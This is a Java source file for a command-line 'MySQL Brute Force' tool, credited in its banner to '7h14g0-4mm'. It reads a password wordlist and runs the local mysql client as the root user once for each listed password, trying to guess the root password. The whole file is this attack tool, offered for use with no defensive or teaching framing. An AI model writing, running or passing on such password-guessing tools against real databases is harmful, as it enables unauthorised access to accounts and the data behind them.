package mysql.bruteforce;

import static org.fusesource.jansi.Ansi.*;
import static org.fusesource.jansi.Ansi.Color.*;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;
import java.io.InputStreamReader;

import org.fusesource.jansi.AnsiConsole;

public class MySQLBruteForce {
    
    public static void main(String[] args) throws IOException, InterruptedException {
        System.setProperty("jansi.passthrough", "true");
        AnsiConsole.systemInstall();
        System.out.println(ansi().eraseScreen().bg(BLACK).render("@|red,bold .......... MySQL Brute Force .......... |@").reset() );
        if (args.length < 1) {
            System.out.println(ansi().fg(WHITE).bg(BLACK).a("Brute Force para MySQL by 7h14g0-4mm").reset());
            System.out.printf("\033[0;32;40mUso: java MySQLBruteForce <wordlist>\033[0m\n");
            System.exit(0);
        }
        String wordlist = args[0] == null ? "" : args[0].trim();
        if (!wordlist.isEmpty()) {
            File file = new File(wordlist);
            FileReader fileReader = null;
            fileReader = new FileReader(file);
            BufferedReader bufferedReader = new BufferedReader(fileReader);
            String path = "/usr/bin/mysql";
            String password;
            String[] commandline;
            while ((password = bufferedReader.readLine()) != null) {
                commandline = new String[] {path, "-u", "root", String.format("-p%s", password)};
                Process process = new ProcessBuilder(commandline).inheritIO().start();
                BufferedReader processBufferedReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                while (processBufferedReader.ready()) {
                    System.out.println(processBufferedReader.readLine());
                }
                process.waitFor();
                processBufferedReader.close();
            }
            bufferedReader.close();
            fileReader.close();
        }
        AnsiConsole.systemUninstall();
    }
    
}